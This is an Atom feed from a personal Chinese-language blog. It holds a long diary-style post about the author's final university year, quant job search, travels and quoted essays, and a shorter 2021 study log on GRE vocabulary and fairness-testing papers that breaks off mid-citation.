<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>山月半轮的博客</title>
  
  <subtitle>Pause and ponder</subtitle>
  <link href="http://yangdong2002.github.io/atom.xml" rel="self"/>
  
  <link href="http://yangdong2002.github.io/"/>
  <updated>2023-10-08T17:13:06.559Z</updated>
  <id>http://yangdong2002.github.io/</id>
  
  <author>
    <name>YangDavid</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>失踪人口回归</title>
    <link href="http://yangdong2002.github.io/2023/10/08/%E5%A4%B1%E8%B8%AA%E4%BA%BA%E5%8F%A3%E5%9B%9E%E5%BD%92/"/>
    <id>http://yangdong2002.github.io/2023/10/08/%E5%A4%B1%E8%B8%AA%E4%BA%BA%E5%8F%A3%E5%9B%9E%E5%BD%92/</id>
    <published>2023-10-08T14:21:52.000Z</published>
    <updated>2023-10-08T17:13:06.559Z</updated>
    
    <content type="html"><![CDATA[<p>才发现距离上次发博客都过了两年半了，发生了太多太多的事了。看到自己之前的想法感觉很有意思，这一路看别人的博客也受了很大启发，只恨自己没多写点，所以为了最小化遗憾，还是随便整理一些日记之类的，尝试记录这两年的一些随想吧！</p><p>长话短说，就是在美国交换时由于各种原因度过了一个痛苦、没有什么结果的大三。我早就知道这样下去自己完蛋了，于是开始了“逃跑”，大四于是随缘找工、实习，因为啥都不知道，目标也一降再降。但没想到最终打开了新世界，运气很好，大四上暗自定下的两个目标都达到了，收到了超出预期的offer，意想不到地最终来到了香港工作。</p><blockquote><p>（摘抄）总的看来我似乎总是失败，忧愁，退而求其次，逃跑。——逃跑。把生活强加于我的，不满意的，统统甩掉。还有不错的运气。无赖汉的勇敢。</p></blockquote><span id="more"></span><h1 id="一些博客"><a href="#一些博客" class="headerlink" title="一些博客"></a>一些博客</h1><p>先把干货放前面，我逐渐开始维护一个几乎每月都会重新读一遍的博客列表，感觉读这些博客温故知新，经常有新的感受。</p><p><a href="https://byvoid.com/zhs/blog/oversea-internship-interviews/">BYVoid 海外实习面试记</a></p><p><a href="https://byvoid.com/zhs/blog/recent-one-year/">BYVoid 这一年来</a></p><p><a href="https://stormraiser.me/2020/04/01/%e5%b1%b1%e7%a9%b7%e6%b0%b4%e5%b0%bd/">StormRaiser 山穷水尽</a></p><p><a href="https://conanhujinming.github.io/post/thoughts_of_hunting_jobs/">Jinming Hu 硕士毕业半年的茫茫社招路</a></p><p><a href="https://blog.csdn.net/wads23456/article/details/100786118">【转载】转计算机大牛-崔添翼</a></p><p><a href="https://cong-ding.medium.com/%E5%AF%A6%E7%BF%92%E9%9D%A2%E8%A9%A6%E8%A8%98-ea8901269a23">Cong Ding 实习面试记</a></p><p><a href="https://trinkle23897.github.io/posts/job-application">n+e’s blog 找工回忆录</a></p><h1 id="大四上"><a href="#大四上" class="headerlink" title="大四上"></a>大四上</h1><h2 id="2022-09-13：无路可走"><a href="#2022-09-13：无路可走" class="headerlink" title="2022-09-13：无路可走"></a>2022-09-13：无路可走</h2><p>感觉还是要去申请学校啊，如果直接去找工，这种就业情况，还这么晚才开始找，还想达到某个薪资阈值，自己真的能复现之前ddd的路吗？</p><p>但申学校的话，申MS要今年攒攒钱。申PhD，推荐信必定要无限弱了。我真的适合搞研究吗，之前搞的方向让我极痛苦还卷，没啥可能申。现在连打算搞啥方向都不知道，没有有关申请方向的研究推大概也去不了好学校。</p><h2 id="2022-10-24-挂第一个面试"><a href="#2022-10-24-挂第一个面试" class="headerlink" title="2022-10-24: 挂第一个面试"></a>2022-10-24: 挂第一个面试</h2><p>浅浅复盘一下失败原因：看了某论坛很多篇面经，某几个题反复考，以为是原题大战，把所有题的并集学会之后就飘了，以为稳了。结果真实考题全是C++八股，和面经的题分布完全不一样。所以不能迷信面经啊。</p><h2 id="2022-10-28-反思"><a href="#2022-10-28-反思" class="headerlink" title="2022-10-28: 反思"></a>2022-10-28: 反思</h2><p>好想暂停亿分钟</p><p>本周焦虑来源：挂本以为简单的重要面试（4天没回复，估计是无了）、被未来的各种可能及它们的ddl淹没</p><p>升血压助攻：被封小区无法出院子、由于学校不放出国而放弃两年前WF总决赛机会</p><p>发现除了和朋友打冷战热斗之外，实习搬砖甚至很快乐，因为只用说啥做啥，目标明确，而且似乎我比较善于搬砖。（注：2022.10我开始了一家小startup的软件工程师实习，也是我的第一个码农实习）</p><p>感觉大概率tier0矿场的未来无了，但其实最开始我就知道这条路虽好，但可能性不大，我不配。</p><p>可能这都是因为自己啥都想要，且不想降低自己的上限。希望自己不要把大二原有的好牌打烂，不要到最后山穷水尽，啥都没了…</p><h2 id="2022-11-05：WF之痛"><a href="#2022-11-05：WF之痛" class="headerlink" title="2022-11-05：WF之痛"></a>2022-11-05：WF之痛</h2><p>受covid影响，WF大陆队伍现状：</p><p>北京大学 教练带队参赛<br>4个大学 仅学生参赛<br>16个大学 无法参赛</p><p>作为因学校拒绝，无法参赛的，只能羡慕可以参赛队所在学校对此比赛的重视和开明的政策。</p><p>安慰自己：北大队稳了啊，感觉真去了也根本打不过哈哈哈。教练一起去，正是为了发表获奖感言和帮队员搬奖杯（</p><h2 id="2022-11-24"><a href="#2022-11-24" class="headerlink" title="2022-11-24"></a>2022-11-24</h2><p>据称某厂开出了第一年365万港币的offer。我大为震撼！</p><h2 id="2022-12-07"><a href="#2022-12-07" class="headerlink" title="2022-12-07"></a>2022-12-07</h2><p>2019-2021: 我要申顶校PhD<br>2022年初：我想申普通校PhD<br>7月：我想活着<br>8月：我想申研究型硕士<br>9月：我想申研究型或工程型硕士，但缺钱<br>10月：我想直接找海外工<br>11月：我想申硕士或找国内工<br>12月：应该算是找到国内工了</p><p>和自己和解了。目前的选择应该也不差（注：此时收到了唯一一个上海的offer，打算躺平了）</p><h2 id="2022-12-12"><a href="#2022-12-12" class="headerlink" title="2022-12-12"></a>2022-12-12</h2><p>趁着放开，趁着周末，我抓住找几个朋友的蹭吃蹭喝蹭住海景房的机会，第一时间来到了祖国最南端——三亚，来了场说走就走的旅游！</p><p>真的是放开了啊，没了许多繁琐流程，更能将精力放在旅游本身。三亚的街上人真的好少，各种游玩体验相当不错，可能因为大家还没反应过来可以旅游，我们是第一批吃螃蟹的人吧。（但东北人来过冬的真的好多，海南不愧是东北“第四省”）</p><p>在三亚湾休闲地捞了捞贝壳，在海棠湾体验了波刺激的涨潮。在水族馆看到了漂亮的水母、beluga (in real life)和头上有犄角的鱼！真希望能多待几天，可惜还要实习，暂时还不能完全躺平。真羡慕他们可以远程办公，全国到处旅游。</p><p>通过各种聊天也得知了朋友的许多秘密和动向。总的来说就是家家都有难念的经+大家都有光明前途🤣几个搞到不少钱的朋友的神秘故事还在延续，又有着新的烦恼。</p><p>感觉自己最近最大的收获可能还是意识到了友情、人脉、沟通的重要性。尽管自己社恐本质决定了我更喜欢在独处时恢复能量，但事实证明本科期间我唯一一件做得远超平均水平的事是靠朋友的，最近的许多机会乃至发展大方向也是通过朋友介绍的！</p><p>如果不出意外的话，完全躺平后直到毕业前的重心应该就放在旅游、培养一些业余爱好、找朋友玩上吧，让自己开心一点。总之就是抓紧上班前接近于gap半年的时间，高强度摸鱼吧</p><p>希望自己也能拥有一些神秘故事啊。能在这行干几年呢？（现在实习老板五年前在VC行业就职体验问题写回答说“五年后答，看看还在不在这一行”，然后五年后果然转行了😂）几年后看看能不能继续stay simple and sometimes naive，像现在这样写出前途未知但无忧无虑、充满信心的文字</p><h2 id="2023-01-03-秋招总结？"><a href="#2023-01-03-秋招总结？" class="headerlink" title="2023-01-03: 秋招总结？"></a>2023-01-03: 秋招总结？</h2><p>陆本cs，大三荒废了。大一大二原计划申PhD，但到了申请季，目标一降再降，不小概率要申找工MEng了，又不想爆金币。暑假学了下知名crypto课CS251，于是想出国读书的同时找crypto厂远程打工补贴学费，也找了个crypto实习开始干，目标明确。</p><p>但10月惊闻曾有陆本cs牛人直接去华尔街quant厂港/新办公室！身边没相关实习但有硬核经历的朋友已经进了quant全职终面。这也是我第一次正式了解quant行业，看到地里华尔街厂的应届生薪资，只能用“抽象”形容。朋友声称前两轮只问了简单概率和编程，于是抱着开彩票的心态，我也跟风，投了几家swe和quant岗。做完oa，我非常高兴地接到了三个面试，于是疯狂刷绿皮书、一亩三分地面经，度过了一段充实时光。但没想到拿到面试已是唯一高光时刻，虽然有两场面得还行，最终却全止步于一轮游。看来自己还是差得太远了。</p><p>还是简历太差，菜是原罪。面试题答得好与不好，都不影响被拒的结局。复盘下来，虽然自己擅长做概率和算法题，但缺少硬核经历，陆本更没法和美本比，所以达不到quant的bar；而swe岗，我没trading厂C++实习，是硬伤。如果之前的时间没有荒废，搞个trading厂实习，至少能提高期望面进的轮数吧…</p><p>11月，知道自己几斤几两后，重心还是回到了留学申请上。但还是赶着秋招末尾投了几家国内量化。没想到一个厂量化岗进度飞快，特别顺利地通过了。顿时感觉心里紧绷几个月的弦松下来了，也不知道是不是被之前几次拒绝耗尽了精力，自己主观地把工作而非留学作为更倾向于的出路了。</p><p>曾经自认为是一个保守而有计划的人，习惯于长期坚持的付出，会进行系统的调研来做选择，喜欢确定性。但最近我则是几周变一个想法，秋招更是缺乏系统准备和计划，开始太晚，各种决策也十分主观，比较“神秘”。幸好最终没有山穷水尽。如果重来，我一定暑假就开投，且至少把已知的靠谱工作和行业都投下。</p><p>但是，最近我的体会是，正如byvoid博客所说，世界竟如此宽广！一位巨神去了香港Jane Street，搞crypto创业的朋友远程办公，自由旅游。还听说藤校有本科生退学去trading厂全职。所以不一定要走前人铺好的路！</p><p>希望我未来不会山穷水尽，无路可走吧。</p><blockquote><p>写下以上文字时的我，还不知道这并不是我秋招的真结局。</p></blockquote><h1 id="寒假"><a href="#寒假" class="headerlink" title="寒假"></a>寒假</h1><h2 id="2023-02-02-～-2023-02-10-香港-上海之旅"><a href="#2023-02-02-～-2023-02-10-香港-上海之旅" class="headerlink" title="2023-02-02 ～ 2023-02-10 香港-上海之旅"></a>2023-02-02 ～ 2023-02-10 香港-上海之旅</h2><blockquote><p>注：截止10月8日，事实证明和ddd的这一趟香港-上海之行成为了各种意义上年度收益最大的旅行。</p></blockquote><h3 id="2023-02-06"><a href="#2023-02-06" class="headerlink" title="2023-02-06"></a>2023-02-06</h3><p>怎么搞钱啊？</p><p>润港。</p><h3 id="2023-02-07"><a href="#2023-02-07" class="headerlink" title="2023-02-07"></a>2023-02-07</h3><p>彻底失败。</p><p><img src="HK.jpg" alt="HK"></p><p><img src="SH.jpg" alt="HK2"></p><h3 id="2023-02-09"><a href="#2023-02-09" class="headerlink" title="2023-02-09"></a>2023-02-09</h3><p>昨天玩得好开心，也学到很多</p><h2 id="2023-02-24"><a href="#2023-02-24" class="headerlink" title="2023-02-24"></a>2023-02-24</h2><p>赢了。</p><h1 id="大四下"><a href="#大四下" class="headerlink" title="大四下"></a>大四下</h1><p>到了大四下，好像更喜欢水群、聊天了，因此最认真记录的东西居然似乎是梦。当时我详细地记录了每天做梦梦见了啥。不过也只在2023-02-20 ～ 2023-06-08进行了记录，之后要么不做梦，要么根本记不起梦见了啥，很奇怪。感觉这可能也是我最惬意、最没有压力、最觉得自己生活在一个完美模拟世界的阶段吧！平时想去哪儿就去哪儿，天天无忧无虑地玩，和朋友聊天。即使有看似重要的选择，也都可以轻松应对，要么是早已有十足信心，要么是错了自己也不在乎，反正nothing is at stake！生活就像玩一个不可能有坏结局的游戏一样。</p><p>这种感觉持续直到毕设论文deadline临近、毕业真的到来、离飞香港越来越近为止。</p><h2 id="2023-03：苏州之旅"><a href="#2023-03：苏州之旅" class="headerlink" title="2023-03：苏州之旅"></a>2023-03：苏州之旅</h2><ul><li><input checked="" disabled="" type="checkbox"> 苏州旅游心愿单</li><li><input checked="" disabled="" type="checkbox"> 进苏中&amp;园区校</li><li><input checked="" disabled="" type="checkbox"> 在读证明和成绩单打印扫描</li><li><input checked="" disabled="" type="checkbox"> 联系XXX</li><li><input checked="" disabled="" type="checkbox"> 和XXX说XX时间写错了</li><li><input checked="" disabled="" type="checkbox"> 工作注意事项</li><li><input checked="" disabled="" type="checkbox"> 买XXX</li></ul><p>去苏大玩</p><h2 id="2023-04-24：兰州之旅"><a href="#2023-04-24：兰州之旅" class="headerlink" title="2023-04-24：兰州之旅"></a>2023-04-24：兰州之旅</h2><p>火车上热情的本地人推荐的：</p><ul><li>三炮台</li><li>马老六</li><li>中山桥 兰山</li><li>牛肉面 推荐二细 6am-3pm一般是早餐 基本都一样好，晚上可以吃炒拉条</li></ul><h2 id="2023-04-06"><a href="#2023-04-06" class="headerlink" title="2023-04-06"></a>2023-04-06</h2><p>From cyy：</p><ul><li>人生失去了意义</li><li>你的人生是什么构成的？</li></ul><p>balance the substance of your past life</p><p>回过神来，又是豪饮！</p><h2 id="2023-04-30：文字游戏"><a href="#2023-04-30：文字游戏" class="headerlink" title="2023-04-30：文字游戏"></a>2023-04-30：文字游戏</h2><p>摘录：</p><p>文字游戏的话我的个人喜好排名看这个<a href="https://vndb.org/uXXXXX">https://vndb.org/uXXXXX</a></p><p>非文字游戏的话仅有一款：星际拓荒</p><p>我觉得你要是对科幻悬疑感兴趣，可以直接开玩：remember11</p><p>当然白色相簿2更好</p><h2 id="2023-05-10-北京之旅"><a href="#2023-05-10-北京之旅" class="headerlink" title="2023-05-10 北京之旅"></a>2023-05-10 北京之旅</h2><p>北京</p><p>美签 5/10 上午8:15❌cancelled</p><p>网友<br>5.11 午饭 参观清华 晚饭✅<br>5.9晚饭 三元桥✅</p><p>朋友<br>5.12 午饭+央美✅<br>5.10 晚饭 + msra✅<br>5.13 晚饭</p><p>吃<br>驴打滚✅<br>豌豆黄✅❤️<br>新疆菜，娜帕里勇❤️<br>那家小馆❤️<br>五道口枣糕❤️</p><p>住<br>day1 三元桥（贵&amp;小）<br>day2&amp;3大红门（远，只为蹭报销）<br>day4 望京，北京商隐公寓❤️</p><p>还去了：雍和宫周围<br>未去：798艺术区，北大，牛街，常见景点</p><h2 id="2023-05-15-Monkey-Business"><a href="#2023-05-15-Monkey-Business" class="headerlink" title="2023-05-15: Monkey Business"></a>2023-05-15: Monkey Business</h2><p>摘抄</p><p>Our first full-year compensation after signing on full-time at DLJ following business school was about eight times what the average college graduate earns at his first job, and we could expect that compensation to double every two years. We traveled the country by private jet, stayed in the best hotels, and ate in the best restaurants. Eventually, though, we realized that the compensation levels and the perks weren’t in place because being an associate in investment banking was a great job. They were in place because the job sucked. The one immutable truism that exists for bankers is that any problem can be solved by throwing enough money and time at it. The implication? The banker’s greatest enemies are those people whose souls are not for sale, and those who realize that time is a nonrenewable commodity.</p><p>The higher a monkey climbs, the more you see of his ass. —General Joseph Stilwell</p><p>Finally, there are the analysts. Monkeys. Tons and tons of little monkeys. Not humans, just monkeys crawling all over each other and pulling lice out of each other’s fur. Those are the analysts.</p><p>You didn’t tell a monkey to make a merger model for you and then expect that there wouldn’t be any mistakes. You had to check the monkey’s work, because monkeys were always liable to leave a few banana peels lying behind.</p><h2 id="2023-05-16"><a href="#2023-05-16" class="headerlink" title="2023-05-16"></a>2023-05-16</h2><p>六年下交，怀念终身</p><p>第一阶段：沉淀<br>第二阶段：那次失眠让我放弃中考<br>第三阶段：我们是c2！<br>第四阶段：剧场效应，全班养蛊<br>第五阶段：小卷绩点，分流成功<br>第六阶段：算法竞赛，绷不住了<br>第七阶段：科研失败，博士梦碎<br>第八阶段：痛定思痛，转行量化<br>第九阶段：外资全拒，再度被锤<br>第十阶段：艰难润港，生死未卜</p><h2 id="2023-06-03"><a href="#2023-06-03" class="headerlink" title="2023-06-03"></a>2023-06-03</h2><h3 id="摘抄：计算机本科找高薪工作速通路线"><a href="#摘抄：计算机本科找高薪工作速通路线" class="headerlink" title="摘抄：计算机本科找高薪工作速通路线"></a>摘抄：计算机本科找高薪工作速通路线</h3><p>最速通：转学美本，除了需要本金、H1B中签率低、难润等问题外彻底成功</p><p>不转学美本，一种方向是量化厂（对冲基金hedge fund/自营交易prop shop）的quant researcher/developer，理想路线：拿个OI/ACM ICPC/数竞/物竞/etc的还行的奖，搞个LinkedIn认识各种前辈来各种network，大一日常处理文化课，做国外lab，享受生活，暑期去实习；大二日常随缘实习/享受生活，暑期实习去谷歌step（女生）或大厂或内资比较顶的量化厂；大三日常随缘实习/享受生活，暑期找到上海或HK或SG顶尖外资fund量化实习，大四拿实习转正或秋招面进HK/SG顶尖外资fund，拿五十万刀的global pay走上人生巅峰</p><h3 id="摘抄：ChatGPT：揭示某些计算机本科和顶尖本科之间的显著差异"><a href="#摘抄：ChatGPT：揭示某些计算机本科和顶尖本科之间的显著差异" class="headerlink" title="摘抄：ChatGPT：揭示某些计算机本科和顶尖本科之间的显著差异"></a>摘抄：ChatGPT：揭示某些计算机本科和顶尖本科之间的显著差异</h3><p>我让ChatGPT写一篇散文，结果我发现他写的挺有意思！我就发上来了</p><p>以下是一些我个人的观察和体会，主要来自我在本科期间的经历。请注意，我所描述的只是一种现象，并不具有普遍适用性。这篇文章旨在描述一种情况，而我并不知道在这种情况下的正确答案是什么，需要读者自行思考。</p><p>在我读计算机本科期间的主要观察是，有一些人在一开始就限制了自己的发展空间，将本科视为一个投篮活动。例如，他们迷恋追求高绩点，或者一开始就确定自己要走某条特定的道路。这种模式存在一个问题，那就是他们很少对自己的人生进行深思熟虑，很多时候只是盲目追随他人的目标，根本不知道自己是否真正喜欢所设定的目标，也没有意识到其他可供选择的机会成本。</p><p>以攻读PhD，博士学位为例。有许多人甚至不知道自己是否对学术感兴趣就申请了博士学位，结果发现自己并不喜欢自己所研究的领域。其中更令人担忧的是攻读博士学位和从事学术研究所需的时间成本。一般来说，攻读博士学位需要大约6年的时间，而某些领域要想获得教职可能还需要进行一些博士后研究，总体上需要花费不少于10年的时间。如果在不清楚自己的兴趣所在的情况下去尝试从事学术研究，结果可能就是将20到30岁的宝贵时光全部用于一件自己完全不感兴趣的事情上。仔细想想，这是多么可怕的情况。人生如此短暂，考虑到人的生理特点，这10年可能已经占据了人生总产出的四分之一以上。如果需要付出极高的努力去做某件事，那么这可能是唯一的机会。</p><p>在我与一些来自排名靠前的国外大学的本科生交流中，我发现他们的氛围与某些本科生完全不同。他们的同学往往在寻找工作机会。当然，并不是因为他们无法申请博士学位，恰恰相反，优秀的本科生拥有非常好的学术和科研资源，可以凭借导师的推荐信进入顶尖学府，而无需拼命发表论文。有些顶级学府的博士生甚至在前三年都没有怎么发表论文，但他们的学术研究最终非常成功。那么为什么美国本科生并不特别喜欢攻读博士学位呢？曾经有一位来自美国的同学问我为什么我们都想申请博士学位，而他的同学们却在寻找工作。我回答说，我对学术方向比较感兴趣，需要攻读博士学位以进行深入研究。当时我觉得我说得很真诚，但后来我发现这只是一种自我欺骗的结果，实际上我只是受到周围学长从事学术研究的影响，而忽视了我自己对写代码等类似安全领域内容的兴趣。</p><p>当我回过神来时，本科已经结束了。当然，我没有申请博士学位。但我可以想象有些人可能就这样申请了博士学位，而他们直到最后才发觉自己并不喜欢学术研究。为什么某些计算机本科生如此热衷于攻读博士学位呢？总的来说，主要是因为就业环境相对较差。有趣的是，知乎上有一个问题：“如何看待2014年国际物理奥林匹克竞赛（IPHO）金牌得主胥晓宇加入对冲基金Citadel？”这个问题是在2019年提出的，当时有些人似乎很惊讶为什么有可能从事学术研究的人不去攻读博士学位。实际上，原因很简单，因为胥晓宇本科就读于普林斯顿大学，所以他可以选择不从事学术研究。如果他本科是在国内读的，那么他很可能就必须从事学术研究了。近年来，情况似乎发生了一定的反转，一些国内非常出色的本科生也开始寻找工作或创业。</p><p>当然，本文的重点并不是讨论是否应该攻读博士学位。在很多情况下，攻读博士学位仍然是最佳选择。本文主要想表达的是，在某些计算机本科生中，并不仅仅是因为某些事情的难度更大，而是因为他们根本没有许多本来可能存在的选择，或者因为思想的限制给他们一种没有其他选择的错觉。事实上，本科阶段在很大程度上应该给人们一个机会去尝试各种内容，并决定自己想要从事的领域，然后在该领域上努力奋斗。但在思想的限制下，有些人可能从头到尾都没有真正尝试过自己的兴趣所在，因此本科的意义也就荡然无存了。</p><h2 id="2023-06-11"><a href="#2023-06-11" class="headerlink" title="2023-06-11"></a>2023-06-11</h2><p>摘抄：朋友的文章</p><blockquote><p>最近越来越感觉自己无力，能做的很有限。我知道这个时代流行写个人史，可实际上太多东西无法估计，不归我们掌控。她贫穷负债累累真的是她活该吗，你锦衣玉食被爱围绕真的是理所应当的吗。我实在想不通为什么“控制一个月十五万”是一件很难的事，父母npy供着养着哄着、“上班只是为了社交”是一件值得骄傲的事，为什么要在别人节衣缩食的帖子下附上自己好吃好喝的照片，为什么在别人年纪轻轻就结婚生子的新闻下评论说自己这个年纪十点后还不能出门。我曾经有一段时间特别漂浮，觉得自己运气很好，总是被眷顾，地球简直像围着我转似的，现在只剩惭愧、害怕和感激。我是觉得人应该活得卑微一点、诚恳一点的，尽管我们的诚恳可能仍旧虚伪，我们的卑微也并没有那么的不堪。可除了谦虚地承受命运以外，我也想不到什么更好的办法了。</p></blockquote><p>摘抄：鲁迅《娜拉走后怎样》</p><p><a href="https://www.marxists.org/chinese/reference-books/luxun/01/018.htm">https://www.marxists.org/chinese/reference-books/luxun/01/018.htm</a></p><p>人生最苦痛的是梦醒了无路可以走。做梦的人是幸福的；倘没有看出可走的路，最要紧的是不要去惊醒他。</p><p>但是，万不可做将来的梦。阿尔志跋绥夫⑤曾经借了他所做的小说，质问过梦想将来的黄金世界的理想家，因为要造那世界，先唤起许多人们来受苦。他说，“你们将黄金世界预约给他们的子孙了，可是有什么给他们自己呢？”有是有的，就是将来的希望。但代价也太大了，为了这希望，要使人练敏了感觉来更深切地感到自己的苦痛，叫起灵魂来目睹他自己的腐烂的尸骸。惟有说诳和做梦，这些时候便见得伟大。所以我想，假使寻不出路，我们所要的就是梦；但不要将来的梦，只要目前的梦。</p><p>　　然而娜拉既然醒了，是很不容易回到梦境的，因此只得走；可是走了以后，有时却也免不掉堕落或回来。否则，就得问：她除了觉醒的心以外，还带了什么去？倘只有一条像诸君一样的紫红的绒绳的围巾，那可是无论宽到二尺或三尺，也完全是不中用。她还须更富有，提包里有准备，直白地说，就是要有钱。</p><p>　　梦是好的；否则，钱是要紧的。</p><p>在经济方面得到自由，就不是傀儡了么？也还是傀儡。无非被人所牵的事可以减少，而自己能牵的傀儡可以增多罢了</p><h2 id="2023-06-30"><a href="#2023-06-30" class="headerlink" title="2023-06-30"></a>2023-06-30</h2><p>这个月各种事马不停蹄，没有喘息的时间，有种不真实感，院里毕业典礼也没任何共鸣，只觉得虚伪做作。</p><p>上了个假学<br>毕了个假业<br>聚了些假餐<br>打了个假工</p><p>一切都太快了。很多朋友恐怕再也见不到了吧。感觉自己错得很多，缺乏独立思考能力，很容易彻底失败，做错误选择和无用功，因此非常需要wzk ddd的建议。但之后，线下见面也就年底和他们在埃及打比赛了吧。</p><p>缺独立思考能力。缺自理能力。缺钱。缺技术水平。缺斗志。啥都缺。</p><p>甚至玩都没玩，难以想象就这样4天后就要去香港全职工作了。</p><h2 id="2023-06-30-1"><a href="#2023-06-30-1" class="headerlink" title="2023-06-30"></a>2023-06-30</h2><p>我的世界线变动点：</p><p>1 上不上少年班 — 上</p><p>结果：-&gt; 认识cyy等人 -&gt; 入门OI/ACM -&gt; 选CS专业<br>平行世界线：郑外/郑一中数竞班 -&gt; MO，冲CMO。但保送被取消，可能遇到高考风险。<br>关键度：高<br>后悔程度：???</p><p>2 伯克利一年<br>结果：寄了<br>平行世界线：???<br>关键度：???</p><p>3 毕业选择，工作/读MS/MEng/PhD — 工作<br>结果：去HK<br>平行世界线：???<br>关键度：???</p><p>4 在XXX时是否好好干 — 没好好干<br>结果：寄了<br>平行世界线：???<br>关键度：???</p><h2 id="2023-07-06"><a href="#2023-07-06" class="headerlink" title="2023-07-06"></a>2023-07-06</h2><p>摘抄：为什么接受彻底失败</p><p>（原题：很多人的心态被进步史观毁掉了）</p><p>原作者：Potato Digger<br>原文链接 <a href="http://xhslink.com/sTToWr">http://xhslink.com/sTToWr</a></p><p>成功学本质是线性的进步史观，marxim的成功学:奴隶-封建-资本-和谐，heygirl的成功学:少数人的自由-多数人的自由-所有人的自由，猴的成功学:⻘年上岸- 中年上市-老年上树。共同点:相信历史/生活有规律可循，默认社会结构的强制性</p><p>这种脑子的好处是，有方向感，死路还是活路，至少不会迷路。坏处是优越感，清人去缅北，发现后者还是部落时代，就歧视了;英人去宁波，发现后者还是封建时 代，就歧视链了;这和一些名校猴面对大专的优越感是同一种优越感。奴役/PUA都 源于优越感，因为我比你高级(源于社会结构决定论，所以我做的不是坏事，而是当正义爹</p><p>反过来也作用于自身。因为假设生活是进步的，所以永远在路上，永远转折点、分水岭、关键事件。小李上岸失败，被迫处于“-”阶段，自暴自弃天天⻨当劳，很多人 的心理被进步史观/成功学毁掉了</p><p>多元史观则主张，历史/生活不存在进步也没有目的，社会结构决定论被行动主体决 定论取代，所以别天天给自己加戏了!岸是你自己想象出来的，没上岸不是你的 错，没尽力才是你的错</p><p>中心、节点和阶段滚了，时间碎了一地，38岁依旧⻘春期，也可以儿童期，主要看心情；追求“成功”不如追求少失败，论文写出来被404是小失败，论文写出来没被 404是中失败，你连论文都写不出来，当然是大失败；考入名校是小失败，卖身名校 是中失败，以名校为荣是大失败</p><p>多元史观又名失败学，胜在好心态。如果知道自己迟早失败，就会平和很多。如果总认为自己会成功，一没成功，你就崩溃了</p><p>一个用人的眼光看世界，放松但不放弃;一个用历史的眼光看世界，时不时感到无 力是因为人成了历史前进的燃料</p><p>进步史观:吃得苦中苦，方为人上人(大理性<br>多元史观:吃得苦中苦，方能少吃苦(小动物</p><h2 id="2023-07-31"><a href="#2023-07-31" class="headerlink" title="2023-07-31"></a>2023-07-31</h2><p>摘抄：Redemption</p><p>这是一个开始，也是一个结束。</p><p>从 NOI2011 到现在，几乎十年过去了。那一年，在我六年的 OI 生涯的最后一战，由于一个小小的疏忽我终于没有获得金牌，此后就是阴云笼罩的日子。这一切的事情，我在之前那一篇 blog 里都讲过了。</p><p>如今，我想这沉重的一页终于到了该翻过去的时候。</p><p>这么多年，无数的痛苦、困惑和自我怀疑，拒绝享受生活，在物理上和精神上自我封闭，一切的一切，根本在于我从没做过一件让自己满意的、在我看来对得起我所肩负的期望事。</p><p>这样一个目标，自然不是仅凭发一篇顶会就算达成了。然而我与我的理想之间，终于不再是有和无的区别，而只有程度的差距。</p><p>锁链已经破除，再也没有消极面对生活的理由。从此以后应该加倍努力工作，努力生活，勇于追求自己所爱的事物。就把之前的十年当作一场大梦，如今终于到了苏醒的时候。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;才发现距离上次发博客都过了两年半了，发生了太多太多的事了。看到自己之前的想法感觉很有意思，这一路看别人的博客也受了很大启发，只恨自己没多写点，所以为了最小化遗憾，还是随便整理一些日记之类的，尝试记录这两年的一些随想吧！&lt;/p&gt;
&lt;p&gt;长话短说，就是在美国交换时由于各种原因度过了一个痛苦、没有什么结果的大三。我早就知道这样下去自己完蛋了，于是开始了“逃跑”，大四于是随缘找工、实习，因为啥都不知道，目标也一降再降。但没想到最终打开了新世界，运气很好，大四上暗自定下的两个目标都达到了，收到了超出预期的offer，意想不到地最终来到了香港工作。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;（摘抄）总的看来我似乎总是失败，忧愁，退而求其次，逃跑。——逃跑。把生活强加于我的，不满意的，统统甩掉。还有不错的运气。无赖汉的勇敢。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>不能再浪费时间了!</title>
    <link href="http://yangdong2002.github.io/2021/02/10/%E4%B8%8D%E8%83%BD%E5%86%8D%E6%B5%AA%E8%B4%B9%E6%97%B6%E9%97%B4%E4%BA%86/"/>
    <id>http://yangdong2002.github.io/2021/02/10/%E4%B8%8D%E8%83%BD%E5%86%8D%E6%B5%AA%E8%B4%B9%E6%97%B6%E9%97%B4%E4%BA%86/</id>
    <published>2021-02-10T07:52:47.000Z</published>
    <updated>2021-02-13T16:03:36.769Z</updated>
    
    <content type="html"><![CDATA[<p>寒假即将过半，坤神在爆碾 CMU Theoretical Computer Science 课程，陈少在进行大脑升级，而我却在 n 刷《进击的巨人》不能自拔… 我们都有光明的前途？</p><p>我还可以抢救一下，不能再爬了！</p><span id="more"></span><h2 id="2021-2-9"><a href="#2021-2-9" class="headerlink" title="2021.2.9"></a>2021.2.9</h2><p>晚上正在看《巨人》颓废，听到老爸背单词的声音… 我破防了，我有啥理由不背单词！仿佛被从美梦里拉了回来。不能继续爬下去了！于是我立即赶紧停止爬行，刷了 GRE 3000 List 10。</p><p>没错，到了 2 月 9 号，已经回家9天了，而我的寒假日均学习时间还是不到 2 小时！天天作息紊乱，所有任务都没有完成，甚至没有开始！现在终于发现寒假日子不多了，打算开始好好学了…</p><p>Flag: 之后回归正常作息，争取一天学 8h 以上。我也将学习 nocriz，记录每天学习历程以起到监督作用。第一个任务是尽快搞定 GRE，以及完成第一个小任务。</p><h2 id="2021-2-10"><a href="#2021-2-10" class="headerlink" title="2021.2.10"></a>2021.2.10</h2><p>上午 3h 背了 GRE List 11, 12，复习 List 10。</p><p>下午大致看了看关于公平性测试论文 [1,2] 的演讲，但文章也没仔细读，后面又去配 RSS 、逛了各种奇怪网站浪费时间了…大致只有效学了 1h。目前的粗浅理解是：公平性测试的目的是尽可能多地找到违反公平性原则的样例以重新训练。例如违反个体公平性原则就是除了性别、种族这种歧视性属性不同的两个输入，模型会给出不同的输出。感觉直接去掉保护特征，公平性一定就保证了啊？这会是严重问题吗？</p><p>[2] 是简单方法，随机搜索。[1] 是高级的梯度方法，类似 FGSM，效果提升明显。</p><p>[1] Zhang, P., Wang, J., Sun, J., Dong, G., Wang, X., 